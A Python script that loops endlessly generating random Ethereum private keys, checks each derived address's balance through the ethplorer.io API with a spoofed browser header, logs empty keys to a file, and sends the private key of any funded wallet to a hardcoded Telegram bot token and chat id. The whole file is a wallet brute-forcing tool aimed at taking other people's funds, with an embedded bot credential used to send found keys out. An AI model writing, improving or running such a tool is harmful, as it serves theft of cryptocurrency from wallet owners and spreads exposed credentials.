
import time
import requests
import eth_keys
import random
import json
import telebot
import datetime
from eth_keys import keys
from eth_utils import decode_hex


def genKey():
    lst = []
    for _ in range(64):
        i = random.randrange(16)
        if i > 9:
            if i == 10: i = 'A'
            elif i == 11: i = "B"
            elif i == 12: i = "C"
            elif i == 13: i = "D"
            elif i == 14: i = "E"
            elif i == 15: i = "F"
        lst.append(i)
    return "".join(map(str, lst))

headersETHVM = {
    'authority': 'api.ethvm.com',
    'method': 'POST',
    'path': '/',
    'scheme': 'https',
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-length': '219',
    'content-type': 'application/json',
    'origin': 'https://www.ethvm.com',
    'referer': 'https://www.ethvm.com/',
    'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
}

header = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36'
}


def checkKey():
    try:
        file = open('list.txt', 'r')
    except IOError as e:
        print('new File creating..')
        countY = 0
    else:
        lines = file.readlines()
        if lines == []:
            countY = 0
        else:
            data, time, key1, slash, countY = lines[-1].split()

    key = genKey()
    priv_key_bytes = decode_hex(key)
    priv_key = keys.PrivateKey(priv_key_bytes)
    adress = priv_key.public_key.to_checksum_address()

    timeCount = str(datetime.datetime.now(tz=None).date()) + ' ' + str(datetime.datetime.now(tz=None).time())[:8]

    jsonETHVM = {"operationName":"getEthBalance","variables":{"hash": adress},"query":"query getEthBalance($hash: String!) {\n  getEthBalance(owner: $hash) {\n    balance\n    __typename\n  }\n}\n"}

    data = 'data=' + adress + '&showTx=all'
    # r = requests.post('https://api.ethvm.com/', headers=headersETHVM, data=data)
    r = requests.get('https://ethplorer.io/service/service.php?data=' + adress + '&showTx=all', headers = header)

    try:
        jsonAns = json.loads(r.text)
    except Exception as e:
        return

    if 'balance' not in jsonAns:
        return

    if jsonAns['balance'] == 0:
        with open('list.txt', 'a') as file:
            file.write(timeCount + ': ' + key + ' | ' + str(int(countY) + 1) + '\n')
        print(timeCount + ': ' + key + " - empty_account")
    else:
        print(key + "NU ZDAROVA")
        bot = telebot.TeleBot("809026438:AAGK1O8X7g_FjMUj1pYJHym5Hqi6PDO7zF4")
        bot.send_message('648967686', 'ZDAROVA - ' + key)
        with open('listX.txt', 'a') as fileX:
            fileX.write(timeCount + ': ' + key + '\n')

while True:
    checkKey()